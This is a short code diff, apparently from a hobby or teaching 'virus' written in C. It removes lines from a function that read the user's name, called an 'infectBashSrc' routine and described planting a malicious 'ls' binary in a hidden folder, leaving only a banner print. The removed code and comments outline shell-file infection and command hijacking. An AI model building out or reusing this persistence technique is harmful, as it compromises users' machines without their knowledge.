@@ -51,23 +51,6 @@ void infectBashSrc(char *userName){
 /* Execute malacious instructions */
 void devastation() {
 	const unsigned char banner[] = "Virus Text... ";
-	
-	// Subroutine 1
-	// Get user name
-	char buf[64];
-	cuserid(buf);
-	printf("\n %s \n",buf);
-	
-	infectBashSrc(buf);
-	
-	// Add export statement if not already ifected
-	
-	// Subroutine 2
-	// Check if the malliciouc ls binary in mallicious folder
-	// if not Create a hidden folder to store the mallicious ls binary
-	// create and compile the binary to that folder
-	
-	
 	write(1, (char *)banner, sizeof(banner));
 }
 
